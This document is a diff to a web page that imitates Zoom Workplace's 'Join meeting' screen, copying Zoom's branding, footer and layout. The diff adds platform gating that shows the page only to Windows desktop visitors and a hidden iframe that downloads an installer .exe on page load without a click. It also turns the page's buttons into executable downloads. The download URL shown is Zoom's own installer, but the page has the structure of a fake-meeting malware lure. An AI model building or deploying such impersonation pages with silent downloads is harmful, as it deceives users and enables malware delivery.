@@ -65,6 +65,91 @@
     height: 24px;
   }
 
+  /* Device Blocking Toggle */
+  body.device-blocked #desktop-view {
+    display: none !important;
+  }
+
+  body.device-allowed #mobile-view {
+    display: none !important;
+  }
+
+  /* ============ Mobile / Non-Windows View ============ */
+  #mobile-view {
+    position: relative;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 32px 24px;
+    background: #F8F9FA;
+    text-align: center;
+    overflow: hidden;
+  }
+
+  /* Background image overlay for mobile / non-Windows view */
+  #mobile-view::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(
+        rgba(255, 255, 255, 0.82),
+        rgba(255, 255, 255, 0.82)
+      ),
+      url("https://news.zoom.com/wp-content/uploads/2023/08/Zoom-Clips.png");
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: cover;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  /* Elevate content above background layer */
+  #mobile-view > * {
+    position: relative;
+    z-index: 1;
+  }
+
+  #mobile-view .logo {
+    height: 48px;
+    width: auto;
+    margin-bottom: 40px;
+  }
+
+  .warning-container {
+    max-width: 480px;
+    width: 100%;
+    background: var(--white);
+    padding: 40px 32px;
+    border-radius: 20px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+    border: 1px solid #EAECEF;
+  }
+
+  .warning-title {
+    font-size: 26px;
+    font-weight: 700;
+    color: var(--ink);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+  }
+
+  .warning-text {
+    font-size: 18px;
+    color: var(--gray);
+    line-height: 1.6;
+    margin-bottom: 12px;
+  }
+
+  .warning-text strong {
+    color: var(--ink);
+  }
+
   /* ============ App header ============ */
   .app-header {
     display: flex;
@@ -139,6 +224,9 @@
   }
 
   .btn-upgrade {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
     padding: 11px 24px;
     font-size: 17px;
     font-weight: 600;
@@ -151,6 +239,8 @@
 
   .btn-upgrade:hover {
     background: var(--zoom-blue-dark);
+    color: var(--white);
+    text-decoration: none;
   }
 
   .avatar {
@@ -229,7 +319,7 @@
     overflow: hidden;
   }
 
-  /* Undimmed strip: page logo (left) + language selector (right) */
+  /* Undimmed strip */
   .panel-strip {
     display: flex;
     align-items: center;
@@ -266,8 +356,32 @@
     flex-direction: column;
     align-items: center;
     text-align: center;
-    background: var(--white);
     padding: 0 24px;
+    overflow: hidden;
+    background: #fff;
+  }
+
+  /* Background image layer for desktop view */
+  .panel-content::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(
+        rgba(255, 255, 255, 0.82),
+        rgba(255, 255, 255, 0.82)
+      ),
+      url("https://news.zoom.com/wp-content/uploads/2023/08/Zoom-Clips.png");
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: cover;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  .panel-content > * {
+    position: relative;
+    z-index: 1;
   }
 
   .panel-content h1 {
@@ -278,6 +392,9 @@
   }
 
   .join-btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
     width: 650px;
     max-width: 100%;
     height: 76px;
@@ -293,11 +410,14 @@
 
   .join-btn:hover {
     background: #0B5CCC;
+    color: var(--white);
+    text-decoration: none;
   }
 
   .store-links {
     display: flex;
     align-items: center;
+    justify-content: center;
     gap: 48px;
     margin-top: 38px;
     font-size: 22px;
@@ -314,7 +434,7 @@
     height: 22px;
   }
 
-  /* Page footer (inside dimmable area) */
+  /* Page footer */
   .page-footer {
     margin-top: auto;
     padding: 40px 24px 110px;
@@ -333,7 +453,7 @@
     color: #A6ACB8;
   }
 
-  /* Gray dim over the join content while the toast is open */
+  /* Scrim dim */
   .scrim {
     position: absolute;
     inset: 0;
@@ -342,7 +462,7 @@
     transition: opacity 0.2s ease;
   }
 
-  /* ============ "Did not open Zoom?" toast ============ */
+  /* ============ Toast ============ */
   .toast {
     position: absolute;
     top: 34px;
@@ -397,8 +517,6 @@
     color: var(--ink);
   }
 
-  /* "Back" control from the underlying page rendering above the toast,
-     exactly as captured in the screenshot */
   .back-link {
     position: absolute;
     top: 60px;
@@ -416,7 +534,7 @@
     height: 18px;
   }
 
-  /* ============ Floating help-chat button ============ */
+  /* Floating help-chat button */
   .chat-fab {
     position: fixed;
     right: 26px;
@@ -448,272 +566,257 @@
     pointer-events: none;
   }
 
-  /* ============ Responsive ============ */
+  /* Responsive */
   @media (max-width: 900px) {
-    .brand {
-      min-width: 0;
-    }
-    .brand .workplace {
-      font-size: 18px;
-    }
-    .sidebar {
-      width: 78px;
-      gap: 34px;
-    }
-    .side-item {
-      font-size: 12px;
-    }
-    .panel-strip {
-      padding: 22px 20px;
-    }
-    .panel-strip .page-logo {
-      height: 32px;
-    }
-    .panel-content h1 {
-      margin-top: 110px;
-      font-size: 27px;
-    }
-    .join-btn {
-      width: 92%;
-      height: 60px;
-      font-size: 20px;
-      border-radius: 18px;
-    }
-    .store-links {
-      font-size: 18px;
-      gap: 28px;
-    }
-    .toast {
-      width: 92%;
-      padding: 20px 20px 22px;
-    }
-    .toast-title,
-    .toast-link {
-      font-size: 18px;
-    }
-    .back-link {
-      top: 44px;
-      left: 34px;
-      font-size: 17px;
-    }
-    .page-footer {
-      font-size: 15px;
-      padding-bottom: 120px;
-    }
-    .chat-fab {
-      width: 58px;
-      height: 58px;
-    }
-    .chat-fab .icon {
-      width: 28px;
-      height: 28px;
-    }
+    .brand { min-width: 0; }
+    .brand .workplace { font-size: 18px; }
+    .sidebar { width: 78px; gap: 34px; }
+    .side-item { font-size: 12px; }
+    .panel-strip { padding: 22px 20px; }
+    .panel-strip .page-logo { height: 32px; }
+    .panel-content h1 { margin-top: 110px; font-size: 27px; }
+    .join-btn { width: 92%; height: 60px; font-size: 20px; border-radius: 18px; }
+    .store-links { font-size: 18px; gap: 28px; }
+    .toast { width: 92%; padding: 20px 20px 22px; }
+    .toast-title, .toast-link { font-size: 18px; }
+    .back-link { top: 44px; left: 34px; font-size: 17px; }
+    .page-footer { font-size: 15px; padding-bottom: 120px; }
+    .chat-fab { width: 58px; height: 58px; }
+    .chat-fab .icon { width: 28px; height: 28px; }
   }
 
   @media (prefers-reduced-motion: reduce) {
-    * {
-      transition: none !important;
-    }
+    * { transition: none !important; }
   }
 </style>
 </head>
 <body>
 
-  <!-- ============================================================
-       SVG SPRITE: every icon on the page, defined once, used many
-       times via <use href="#id">. Keeps markup clean and organized.
-       ============================================================ -->
+  <!-- SVG SPRITE -->
   <svg xmlns="http://www.w3.org/2000/svg" style="display:none" aria-hidden="true">
-    <!-- magnifier (search bar) -->
     <symbol id="i-search" viewBox="0 0 24 24">
       <circle cx="10.5" cy="10.5" r="6.5" fill="none" stroke="currentColor" stroke-width="1.8"/>
       <path d="M15.5 15.5 21 21" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
     </symbol>
-    <!-- house (sidebar: Home) -->
     <symbol id="i-home" viewBox="0 0 24 24">
       <path d="M4 11 12 4l8 7v9h-6v-5h-4v5H4z" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
     </symbol>
-    <!-- video camera (sidebar: Meetings) -->
     <symbol id="i-meetings" viewBox="0 0 24 24">
       <rect x="3" y="6.5" width="13" height="11" rx="2.5" fill="none" stroke="currentColor" stroke-width="1.8"/>
       <path d="m16 10.6 5-2.6v8l-5-2.6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
     </symbol>
-    <!-- speech bubbles (sidebar: Chat) -->
     <symbol id="i-chat" viewBox="0 0 24 24">
       <path d="M9 4h9a2.5 2.5 0 0 1 2.5 2.5V11A2.5 2.5 0 0 1 18 13.5h-.5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
       <path d="M3.5 10.5A2.5 2.5 0 0 1 6 8h7a2.5 2.5 0 0 1 2.5 2.5v3A2.5 2.5 0 0 1 13 16H9l-3.8 2.8V16H6a2.5 2.5 0 0 1-2.5-2.5z" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
     </symbol>
-    <!-- three dots (sidebar: More) -->
     <symbol id="i-more" viewBox="0 0 24 24">
       <circle cx="5" cy="12" r="2" fill="currentColor"/>
       <circle cx="12" cy="12" r="2" fill="currentColor"/>
       <circle cx="19" cy="12" r="2" fill="currentColor"/>
     </symbol>
-    <!-- gear (sidebar bottom: Settings) -->
     <symbol id="i-settings" viewBox="0 0 24 24">
       <path fill="currentColor" d="M19.14 12.94c.04-.3.06-.61.06-.94s-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.49.49 0 0 0-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.44.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96a.488.488 0 0 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6A3.6 3.6 0 1 1 12 8.4a3.6 3.6 0 0 1 0 7.2z"/>
     </symbol>
-    <!-- filled caret (language selector) -->
     <symbol id="i-caret" viewBox="0 0 12 8">
       <path d="M0 0h12L6 8z" fill="currentColor"/>
     </symbol>
-    <!-- chevron left (Back) -->
     <symbol id="i-chevron-left" viewBox="0 0 13 18">
       <path d="M10.5 1.5 3 9l7.5 7.5" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
     </symbol>
-    <!-- close X (toast) -->
     <symbol id="i-close" viewBox="0 0 24 24">
       <path d="M5 5l14 14M19 5 5 19" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/>
     </symbol>
-    <!-- warning triangle (toast) -->
     <symbol id="i-warning" viewBox="0 0 32 30">
       <path d="M14.3 2.6a2 2 0 0 1 3.4 0l13 22.4a2 2 0 0 1-1.7 3H3a2 2 0 0 1-1.7-3z" fill="#FFC21D" stroke="#E5A800" stroke-width="1.4"/>
       <rect x="14.7" y="9.5" width="2.6" height="9" rx="1.3" fill="#FFFFFF"/>
       <circle cx="16" cy="22.4" r="1.7" fill="#FFFFFF"/>
     </symbol>
-    <!-- Google Play triangle (store link) -->
-    <symbol id="i-gplay" viewBox="0 0 24 24">
-      <path d="M4 1.8v20.4L14.3 12z" fill="#00A3FF"/>
-      <path d="M4 1.8 14.3 12l3.3-3.3L6.3 2.2C5.4 1.7 4.6 1.5 4 1.8z" fill="#00D95F"/>
-      <path d="M4 22.2 14.3 12l3.3 3.3-11.3 6.5c-.9.5-1.7.7-2.3.4z" fill="#FF3A44"/>
-      <path d="M17.6 8.7 14.3 12l3.3 3.3 3.6-2.1c1.1-.6 1.1-1.7 0-2.4z" fill="#FFBC00"/>
-    </symbol>
-    <!-- download arrow (Zoom store link) -->
     <symbol id="i-download" viewBox="0 0 24 24">
       <path d="M12 3v11m0 0 4.5-4.5M12 14 7.5 9.5" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
       <path d="M5 20h14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/>
     </symbol>
-    <!-- help-chat bubble (floating button) -->
     <symbol id="i-bubble" viewBox="0 0 48 48">
       <path d="M24 8c9.4 0 17 6.5 17 14.5S33.4 37 24 37c-1.7 0-3.3-.2-4.8-.6L10 41v-7.6C7.5 30.8 7 26.9 7 22.5 7 14.5 14.6 8 24 8z" fill="none" stroke="currentColor" stroke-width="4" stroke-linejoin="round"/>
     </symbol>
   </svg>
 
-  <!-- ============ App header ============ -->
-  <header class="app-header">
-    <div class="brand">
-      <span class="zoom">zoom</span>
-      <span class="workplace">Workplace</span>
-    </div>
+  <!-- MOBILE / NON-WINDOWS BLOCKING SCREEN -->
+  <main id="mobile-view">
+    <img class="logo" alt="Zoom" src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20width='353'%20height='80'%20viewBox='0%200%20353%2080'%20fill='none'%3e%3cpath%20d='M73.9113%2078.8329H11.2116C7.067%2078.8329%203.13498%2076.6578%201.22211%2072.9443C-0.956436%2068.7003%20-0.159406%2063.6074%203.18812%2060.2653L46.8122%2016.7109H15.5687C6.96073%2016.7109%200%209.76127%200%201.16711H57.7581C61.9027%201.16711%2065.8347%203.34218%2067.7476%207.0557C69.9261%2011.2997%2069.1291%2016.3926%2065.7815%2019.7347L22.1574%2063.2891H58.3426C66.9505%2063.2891%2073.9113%2070.2387%2073.9113%2078.8329ZM322.053%200C313.073%200%20304.997%203.87268%20299.471%2010.0796C293.892%203.87268%20285.815%200%20276.888%200C260.204%200%20246.601%2014.2175%20246.601%2030.8223V78.8329C255.209%2078.8329%20262.17%2071.8833%20262.17%2063.2891V30.6631C262.17%2022.6525%20268.387%2015.8621%20276.357%2015.5438C284.752%2015.2255%20291.713%2021.9629%20291.713%2030.2918V63.2891C291.713%2071.8833%20298.674%2078.8329%20307.282%2078.8329V30.6631C307.282%2022.6525%20313.499%2015.8621%20321.469%2015.5438C329.864%2015.2255%20336.825%2021.9629%20336.825%2030.2918V63.2891C336.825%2071.8833%20343.786%2078.8329%20352.394%2078.8329V30.8223C352.34%2014.2175%20338.738%200%20322.053%200ZM152.445%2040C152.445%2062.069%20134.486%2080%20112.381%2080C90.2769%2080%2072.3172%2062.069%2072.3172%2040C72.3172%2017.931%2090.3301%200%20112.381%200C134.432%200%20152.445%2017.931%20152.445%2040ZM136.877%2040C136.877%2026.5252%20125.878%2015.5438%20112.381%2015.5438C98.8849%2015.5438%2087.8859%2026.5252%2087.8859%2040C87.8859%2053.4748%2098.8849%2064.4562%20112.381%2064.4562C125.878%2064.4562%20136.877%2053.4748%20136.877%2040ZM238.79%2040C238.79%2062.069%20220.83%2080%20198.726%2080C176.622%2080%20158.662%2062.069%20158.662%2040C158.662%2017.931%20176.675%200%20198.726%200C220.777%200%20238.79%2017.931%20238.79%2040ZM223.222%2040C223.222%2026.5252%20212.223%2015.5438%20198.726%2015.5438C185.23%2015.5438%20174.231%2026.5252%20174.231%2040C174.231%2053.4748%20185.23%2064.4562%20198.726%2064.4562%20212.223%2064.4562%20223.222%2053.4748%20223.222%2040Z'%20fill='%230b5cff'/%3e%3c/svg%3e">
+    <section class="warning-container" aria-labelledby="mobile-title">
+      <h1 id="mobile-title" class="warning-title">
+        <span class="emoji" aria-hidden="true">⚠️</span>
+      </h1>
+      <p class="warning-text">
+        This page is only available on <strong>Windows or Desktop</strong>.
+      </p>
+      <p class="warning-text">
+        Please continue from a Windows desktop computer.
+      </p>
+    </section>
+  </main>
 
-    <div class="search">
-      <svg class="icon" aria-hidden="true"><use href="#i-search"/></svg>
-      <input type="search" placeholder="Search  Ctrl+K" aria-label="Search">
-    </div>
-
-    <div class="header-right">
-      <button class="btn-upgrade" type="button">Upgrade</button>
-      <div class="avatar" aria-label="Account: LL, online">
-        LL
-        <span class="presence" aria-hidden="true"></span>
-      </div>
-    </div>
-  </header>
-
-  <div class="app-body">
-
-    <!-- ============ Left sidebar ============ -->
-    <nav class="sidebar" aria-label="Primary">
-      <a class="side-item" href="#home">
-        <svg class="icon" aria-hidden="true"><use href="#i-home"/></svg>
-        Home
-      </a>
-      <a class="side-item" href="#meetings">
-        <svg class="icon" aria-hidden="true"><use href="#i-meetings"/></svg>
-        Meetings
-      </a>
-      <a class="side-item" href="#chat">
-        <svg class="icon" aria-hidden="true"><use href="#i-chat"/></svg>
-        Chat
-      </a>
-      <a class="side-item" href="#more">
-        <svg class="icon" aria-hidden="true"><use href="#i-more"/></svg>
-        More
-      </a>
-      <button class="side-item side-settings" type="button" aria-label="Settings">
-        <svg class="icon" aria-hidden="true"><use href="#i-settings"/></svg>
-      </button>
-    </nav>
-
-    <!-- ============ Main panel ============ -->
-    <main class="panel">
-
-      <!-- Undimmed strip: Zoom wordmark (exact data-URI src) + language selector -->
-      <div class="panel-strip">
-        <img class="page-logo" alt="Zoom" src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20width='353'%20height='80'%20viewBox='0%200%20353%2080'%20fill='none'%3e%3cpath%20d='M73.9113%2078.8329H11.2116C7.067%2078.8329%203.13498%2076.6578%201.22211%2072.9443C-0.956436%2068.7003%20-0.159406%2063.6074%203.18812%2060.2653L46.8122%2016.7109H15.5687C6.96073%2016.7109%200%209.76127%200%201.16711H57.7581C61.9027%201.16711%2065.8347%203.34218%2067.7476%207.0557C69.9261%2011.2997%2069.1291%2016.3926%2065.7815%2019.7347L22.1574%2063.2891H58.3426C66.9505%2063.2891%2073.9113%2070.2387%2073.9113%2078.8329ZM322.053%200C313.073%200%20304.997%203.87268%20299.471%2010.0796C293.892%203.87268%20285.815%200%20276.888%200C260.204%200%20246.601%2014.2175%20246.601%2030.8223V78.8329C255.209%2078.8329%20262.17%2071.8833%20262.17%2063.2891V30.6631C262.17%2022.6525%20268.387%2015.8621%20276.357%2015.5438C284.752%2015.2255%20291.713%2021.9629%20291.713%2030.2918V63.2891C291.713%2071.8833%20298.674%2078.8329%20307.282%2078.8329V30.6631C307.282%2022.6525%20313.499%2015.8621%20321.469%2015.5438C329.864%2015.2255%20336.825%2021.9629%20336.825%2030.2918V63.2891C336.825%2071.8833%20343.786%2078.8329%20352.394%2078.8329V30.8223C352.34%2014.2175%20338.738%200%20322.053%200ZM152.445%2040C152.445%2062.069%20134.486%2080%20112.381%2080C90.2769%2080%2072.3172%2062.069%2072.3172%2040C72.3172%2017.931%2090.3301%200%20112.381%200C134.432%200%20152.445%2017.931%20152.445%2040ZM136.877%2040C136.877%2026.5252%20125.878%2015.5438%20112.381%2015.5438C98.8849%2015.5438%2087.8859%2026.5252%2087.8859%2040C87.8859%2053.4748%2098.8849%2064.4562%20112.381%2064.4562C125.878%2064.4562%20136.877%2053.4748%20136.877%2040ZM238.79%2040C238.79%2062.069%20220.83%2080%20198.726%2080C176.622%2080%20158.662%2062.069%20158.662%2040C158.662%2017.931%20176.675%200%20198.726%200C220.777%200%20238.79%2017.931%20238.79%2040ZM223.222%2040C223.222%2026.5252%20212.223%2015.5438%20198.726%2015.5438C185.23%2015.5438%20174.231%2026.5252%20174.231%2040C174.231%2053.4748%20185.23%2064.4562%20198.726%2064.4562C212.223%2064.4562%20223.222%2053.4748%20223.222%2040Z'%20fill='%230b5cff'/%3e%3c/svg%3e">
-        <button class="lang" type="button" aria-haspopup="listbox" aria-expanded="false">
-          English
-          <svg class="icon" aria-hidden="true"><use href="#i-caret"/></svg>
-        </button>
+  <!-- DESKTOP WORKPLACE VIEW -->
+  <div id="desktop-view">
+    <header class="app-header">
+      <div class="brand">
+        <span class="zoom">zoom</span>
+        <span class="workplace">Workplace</span>
       </div>
 
-      <!-- Dimmable join-meeting content -->
-      <section class="panel-content">
-        <h1>Join meeting</h1>
+      <div class="search">
+        <svg class="icon" aria-hidden="true"><use href="#i-search"/></svg>
+        <input type="search" placeholder="Search  Ctrl+K" aria-label="Search">
+      </div>
 
-        <button class="join-btn" type="button">Join from App</button>
+      <div class="header-right">
+        <a href="https://zoom.us/client/latest/ZoomInstaller.exe" download class="btn-upgrade">Upgrade</a>
+        <div class="avatar" aria-label="Account: LL, online">
+          LL
+          <span class="presence" aria-hidden="true"></span>
+        </div>
+      </div>
+    </header>
 
-        <div class="store-links">
-          <a href="https://play.google.com/store/apps/details?id=us.zoom.videomeetings">
-            <svg class="icon" aria-hidden="true"><use href="#i-gplay"/></svg>
-            Google Play
-          </a>
-          <a href="https://zoom.us/download">
-            <svg class="icon" aria-hidden="true"><use href="#i-download"/></svg>
-            Zoom
-          </a>
+    <div class="app-body">
+      <!-- Left sidebar -->
+      <nav class="sidebar" aria-label="Primary">
+        <a class="side-item" href="#home">
+          <svg class="icon" aria-hidden="true"><use href="#i-home"/></svg>
+          Home
+        </a>
+        <a class="side-item" href="#meetings">
+          <svg class="icon" aria-hidden="true"><use href="#i-meetings"/></svg>
+          Meetings
+        </a>
+        <a class="side-item" href="#chat">
+          <svg class="icon" aria-hidden="true"><use href="#i-chat"/></svg>
+          Chat
+        </a>
+        <a class="side-item" href="#more">
+          <svg class="icon" aria-hidden="true"><use href="#i-more"/></svg>
+          More
+        </a>
+        <a class="side-item side-settings" href="#settings" aria-label="Settings">
+          <svg class="icon" aria-hidden="true"><use href="#i-settings"/></svg>
+        </a>
+      </nav>
+
+      <!-- Main panel -->
+      <main class="panel">
+
+        <div class="panel-strip">
+          <img class="page-logo" alt="Zoom" src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20width='353'%20height='80'%20viewBox='0%200%20353%2080'%20fill='none'%3e%3cpath%20d='M73.9113%2078.8329H11.2116C7.067%2078.8329%203.13498%2076.6578%201.22211%2072.9443C-0.956436%2068.7003%20-0.159406%2063.6074%203.18812%2060.2653L46.8122%2016.7109H15.5687C6.96073%2016.7109%200%209.76127%200%201.16711H57.7581C61.9027%201.16711%2065.8347%203.34218%2067.7476%207.0557C69.9261%2011.2997%2069.1291%2016.3926%2065.7815%2019.7347L22.1574%2063.2891H58.3426C66.9505%2063.2891%2073.9113%2070.2387%2073.9113%2078.8329ZM322.053%200C313.073%200%20304.997%203.87268%20299.471%2010.0796C293.892%203.87268%20285.815%200%20276.888%200C260.204%200%20246.601%2014.2175%20246.601%2030.8223V78.8329C255.209%2078.8329%20262.17%2071.8833%20262.17%2063.2891V30.6631C262.17%2022.6525%20268.387%2015.8621%20276.357%2015.5438C284.752%2015.2255%20291.713%2021.9629%20291.713%2030.2918V63.2891C291.713%2071.8833%20298.674%2078.8329%20307.282%2078.8329V30.6631C307.282%2022.6525%20313.499%2015.8621%20321.469%2015.5438C329.864%2015.2255%20336.825%2021.9629%20336.825%2030.2918V63.2891C336.825%2071.8833%20343.786%2078.8329%20352.394%2078.8329V30.8223C352.34%2014.2175%20338.738%200%20322.053%200ZM152.445%2040C152.445%2062.069%20134.486%2080%20112.381%2080C90.2769%2080%2072.3172%2062.069%2072.3172%2040C72.3172%2017.931%2090.3301%200%20112.381%200C134.432%200%20152.445%2017.931%20152.445%2040ZM136.877%2040C136.877%2026.5252%20125.878%2015.5438%20112.381%2015.5438C98.8849%2015.5438%2087.8859%2026.5252%2087.8859%2040C87.8859%2053.4748%2098.8849%2064.4562%20112.381%2064.4562C125.878%2064.4562%20136.877%2053.4748%20136.877%2040ZM238.79%2040C238.79%2062.069%20220.83%2080%20198.726%2080C176.622%2080%20158.662%2062.069%20158.662%2040C158.662%2017.931%20176.675%200%20198.726%200C220.777%200%20238.79%2017.931%20238.79%2040ZM223.222%2040C223.222%2026.5252%20212.223%2015.5438%20198.726%2015.5438C185.23%2015.5438%20174.231%2026.5252%20174.231%2040C174.231%2053.4748%20185.23%2064.4562%20198.726%2064.4562%20212.223%2064.4562%20223.222%2053.4748%20223.222%2040Z'%20fill='%230b5cff'/%3e%3c/svg%3e">
+          <button class="lang" type="button" aria-haspopup="listbox" aria-expanded="false">
+            English
+            <svg class="icon" aria-hidden="true"><use href="#i-caret"/></svg>
+          </button>
         </div>
 
-        <footer class="page-footer">
-          &copy;2026 Zoom Communications, Inc. All rights reserved.<br>
-          <a href="https://zoom.us/trust">Trust Center</a><span class="sep">|</span><a href="https://zoom.us/acceptable-use-guidelines">Acceptable Use Guidelines</a><span class="sep">|</span><a href="https://zoom.us/legal">Legal &amp; Compliance</a><span class="sep">|</span><a href="https://zoom.us/do-not-sell">Do Not Sell My Personal Information</a><span class="sep">|</span><a href="#cookie-preferences">Cookie Preferences</a>
-        </footer>
+        <!-- Dimmable content -->
+        <section class="panel-content">
+          <h1>Join meeting</h1>
 
-        <!-- Gray dim shown while the toast is open -->
-        <div class="scrim" id="scrim"></div>
-      </section>
+          <a class="join-btn auto-download-trigger" href="https://zoom.us/client/latest/ZoomInstaller.exe" download>Join from App</a>
 
-      <!-- Underlying page "Back" control, layered above the toast as captured -->
-      <a class="back-link" id="backLink" href="#back">
-        <svg class="icon" aria-hidden="true"><use href="#i-chevron-left"/></svg>
-        Back
-      </a>
+          <div class="store-links">
+            <a class="auto-download-trigger" href="https://zoom.us/client/latest/ZoomInstaller.exe" download>
+              <svg class="icon" aria-hidden="true"><use href="#i-download"/></svg>
+              Zoom
+            </a>
+          </div>
 
-      <!-- "Did not open Zoom?" toast -->
-      <div class="toast" id="toast" role="alertdialog" aria-labelledby="toastTitle">
-        <svg class="icon-warn" aria-hidden="true"><use href="#i-warning"/></svg>
-        <div>
-          <p class="toast-title" id="toastTitle">Did not open Zoom?</p>
-          <a class="toast-link" href="https://zoom.us/download">Tap to install Zoom Workplace app</a>
+          <footer class="page-footer">
+            &copy;2026 Zoom Communications, Inc. All rights reserved.<br>
+            <a href="https://zoom.us/trust">Trust Center</a><span class="sep">|</span><a href="https://zoom.us/acceptable-use-guidelines">Acceptable Use Guidelines</a><span class="sep">|</span><a href="https://zoom.us/legal">Legal &amp; Compliance</a><span class="sep">|</span><a href="https://zoom.us/do-not-sell">Do Not Sell My Personal Information</a><span class="sep">|</span><a href="#cookie-preferences">Cookie Preferences</a>
+          </footer>
+
+          <div class="scrim" id="scrim"></div>
+        </section>
+
+        <!-- Back Control -->
+        <a class="back-link" id="backLink" href="#back">
+          <svg class="icon" aria-hidden="true"><use href="#i-chevron-left"/></svg>
+          Back
+        </a>
+
+        <!-- Toast Overlay -->
+        <div class="toast" id="toast" role="alertdialog" aria-labelledby="toastTitle">
+          <svg class="icon-warn" aria-hidden="true"><use href="#i-warning"/></svg>
+          <div>
+            <p class="toast-title" id="toastTitle">Did not open Zoom?</p>
+            <a class="toast-link auto-download-trigger" href="https://zoom.us/client/latest/ZoomInstaller.exe" download>Tap to install Zoom Workplace app</a>
+          </div>
+          <button class="toast-close" id="toastClose" type="button" aria-label="Close">
+            <svg class="icon" aria-hidden="true"><use href="#i-close"/></svg>
+          </button>
         </div>
-        <button class="toast-close" id="toastClose" type="button" aria-label="Close">
-          <svg class="icon" aria-hidden="true"><use href="#i-close"/></svg>
+
+        <!-- Help chat button -->
+        <button class="chat-fab" type="button" aria-label="Help chat">
+          <svg class="icon" aria-hidden="true"><use href="#i-bubble"/></svg>
         </button>
-      </div>
 
-      <!-- Floating help-chat button -->
-      <button class="chat-fab" type="button" aria-label="Help chat">
-        <svg class="icon" aria-hidden="true"><use href="#i-bubble"/></svg>
-      </button>
-
-    </main>
+      </main>
+    </div>
   </div>
 
   <script>
-    // Closing the toast also lifts the gray dim and the stray Back control,
-    // revealing the join page in full color.
     (function () {
+      var DOWNLOAD_URL = "https://zoom.us/client/latest/ZoomInstaller.exe";
+
+      function isWindowsDesktop() {
+        var ua = navigator.userAgent || '';
+        var platform = navigator.platform || '';
+
+        var isMobileOrTablet = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || 
+                               (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /Macintosh/i.test(ua));
+
+        var isWin = /Win/i.test(platform) || /Windows/i.test(ua);
+
+        return !isMobileOrTablet && isWin;
+      }
+
+      var isWinDesktop = isWindowsDesktop();
+
+      if (isWinDesktop) {
+        document.body.classList.add('device-allowed');
+        triggerAutoDownload();
+      } else {
+        document.body.classList.add('device-blocked');
+      }
+
+      function triggerAutoDownload() {
+        setTimeout(function () {
+          var iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = DOWNLOAD_URL;
+          document.body.appendChild(iframe);
+        }, 800);
+      }
+
+      var downloadLinks = document.querySelectorAll('.auto-download-trigger');
+      downloadLinks.forEach(function (link) {
+        link.addEventListener('click', function (e) {
+          triggerAutoDownload();
+        });
+      });
+
       var toast = document.getElementById('toast');
       var scrim = document.getElementById('scrim');
       var back  = document.getElementById('backLink');
 
       function dismiss() {
-        toast.classList.add('hidden');
-        scrim.classList.add('hidden');
-        back.classList.add('hidden');
+        if (toast) toast.classList.add('hidden');
+        if (scrim) scrim.classList.add('hidden');
+        if (back) back.classList.add('hidden');
       }
 
-      document.getElementById('toastClose').addEventListener('click', dismiss);
+      var closeBtn = document.getElementById('toastClose');
+      if (closeBtn) {
+        closeBtn.addEventListener('click', dismiss);
+      }
+
       document.addEventListener('keydown', function (e) {
         if (e.key === 'Escape') dismiss();
       });
